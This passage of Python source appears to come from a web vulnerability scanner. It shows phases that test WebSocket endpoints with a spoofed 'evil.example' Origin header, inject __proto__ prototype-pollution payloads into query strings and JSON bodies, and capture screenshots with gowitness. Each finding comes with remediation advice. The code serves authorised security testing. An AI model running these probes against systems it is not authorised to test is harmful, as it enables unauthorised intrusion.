                "Connection": "Upgrade", "Upgrade": "websocket",
                "Sec-WebSocket-Version": "13", "Sec-WebSocket-Key": key,
                "Origin": "https://evil.example",
            }, allow_redirects=False)
            if r.status_code == 101 or 'sec-websocket-accept' in {k.lower() for k in r.headers}:
                ws_endpoints.add(url)
                add_finding(Finding(
                    title=f"WebSocket Endpoint Accepts Cross-Origin Handshake: {path}",
                    severity=Severity.MEDIUM,
                    description=(f"The WebSocket endpoint at {path} completed an Upgrade handshake with a "
                                 f"foreign Origin header — suggests missing origin validation (Cross-Site WebSocket Hijacking risk)."),
                    evidence=f"GET {url} (Origin: https://evil.example) → HTTP {r.status_code}",
                    recommendation="Validate the Origin header on WebSocket handshakes and tie sessions to anti-CSRF tokens.",
                    phase=phase), out, cfg)
        except Exception:
            continue

    if ws_endpoints:
        add_finding(Finding(
            title=f"WebSocket Endpoints Discovered ({len(ws_endpoints)})",
            severity=Severity.INFO,
            description="WebSocket endpoints were referenced or responded to handshakes.",
            evidence='\n'.join(sorted(ws_endpoints)[:20]),
            recommendation="Review WebSocket auth, origin checks, and message authorisation.",
            phase=phase), out, cfg)
    else:
        _log(out, "> No WebSocket endpoints discovered.")
    st.mark(phase)


def phase_prototype_pollution(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Prototype Pollution Probe (server-side reflection / fault).

    Tests for prototype pollution gadgets in both query strings and JSON bodies.
    Detects successful pollution via server-side faults (2xx→500 status change)
    or marker reflection on prototype keys.
    """
    phase = "prototype_pollution"
    if st.done(phase): return
    section("Prototype Pollution Probe", out)

    sess = make_session(cfg)
    marker = "wrpp" + hashlib.md5(os.urandom(6)).hexdigest()[:6]

    # Endpoints to probe: discovered API endpoints + base
    with DISCOVERED._lock:
        endpoints = [urljoin(cfg.base_url, e) for e in list(DISCOVERED.endpoints)[:8]
                     if e.startswith('/')]
    endpoints = list(dict.fromkeys([cfg.base_url] + endpoints))

    hit = False
    for url in endpoints:
        # Query-string gadget
        qs_url = f"{url}{'&' if '?' in url else '?'}__proto__[{marker}]=polluted"
        try:
            base = sess.get(url, timeout=cfg.timeout)
            r = sess.get(qs_url, timeout=cfg.timeout)
            # Server-side fault: pollution that breaks rendering → 500 where baseline was 2xx
            if base.status_code < 500 <= r.status_code:
                add_finding(Finding(
                    title="Possible Prototype Pollution (server fault)",
                    severity=Severity.MEDIUM,
                    description=f"A `__proto__` gadget in the query string changed the response status from {base.status_code} to {r.status_code} at {url}.",
                    evidence=f"Baseline {url} → {base.status_code}\nPolluted {qs_url} → {r.status_code}",
                    recommendation="Reject/strip `__proto__`, `constructor`, `prototype` keys when merging untrusted objects. Use null-prototype objects or Map.",
                    phase=phase), out, cfg)
                hit = True
        except Exception:
            pass

        # JSON body gadget
        try:
            payload = {"__proto__": {marker: "polluted"}}
            base = sess.post(url, json={"x": 1}, timeout=cfg.timeout)
            r = sess.post(url, json=payload, timeout=cfg.timeout)
            if base.status_code < 500 <= r.status_code:
                add_finding(Finding(
                    title="Possible Prototype Pollution (JSON body, server fault)",
                    severity=Severity.MEDIUM,
                    description=f"A `__proto__` key in a JSON body changed the response status from {base.status_code} to {r.status_code} at {url}.",
                    evidence=f"POST {url} {{\"x\":1}} → {base.status_code}\nPOST __proto__ gadget → {r.status_code}",
                    recommendation="Sanitise keys before deep-merge; freeze Object.prototype; prefer Map/null-prototype objects.",
                    phase=phase), out, cfg)
                hit = True
            # Reflected marker on a prototype key is a strong signal
            elif marker in r.text and marker not in base.text:
                add_finding(Finding(
                    title="Prototype Pollution Gadget Reflected",
                    severity=Severity.LOW,
                    description=f"The injected `__proto__` marker was reflected in the response at {url} — investigate for pollution side-effects.",
                    evidence=f"POST {url} with __proto__[{marker}] → marker present in response.",
                    recommendation="Verify the server does not merge attacker keys into shared objects/prototypes.",
                    phase=phase), out, cfg)
                hit = True
        except Exception:
            pass

    if not hit:
        _log(out, "> No prototype pollution side-effects observed.")
    st.mark(phase)


def phase_screenshots(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Visual Reconnaissance via Screenshots.

    Uses gowitness to capture screenshots of the target URL for manual
    review and visual reconnaissance. Stores in ./screenshots/ directory.
    """
    phase = "screenshots"
    if st.done(phase): return
    section("Screenshots (gowitness)", out)
    if _tool_ok("gowitness", out):
        os.makedirs("./screenshots", exist_ok=True)
        run_cmd(["gowitness", "single", "--url", cfg.base_url,
                 "--screenshot-path", "./screenshots"],
                "gowitness", out, cfg, 60)
    st.mark(phase)
